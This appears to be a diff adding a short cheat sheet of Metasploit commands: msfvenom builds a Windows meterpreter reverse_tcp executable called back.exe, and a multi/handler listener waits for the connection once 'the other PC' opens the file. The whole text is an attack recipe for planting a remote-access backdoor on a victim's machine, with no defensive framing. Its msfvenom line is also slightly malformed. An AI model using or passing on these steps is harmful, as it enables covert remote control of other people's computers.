@@ -1,0 +1,7 @@
+Create a Backdoor: msfvenom -p windows/meterpreter/reverse_tcp - platform windows-a x86 -f exe -o /root/Desktop/back.exe
+Start Metasploit: msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST (your ip address)
+exploit
+[Other PC has to open backdoor]
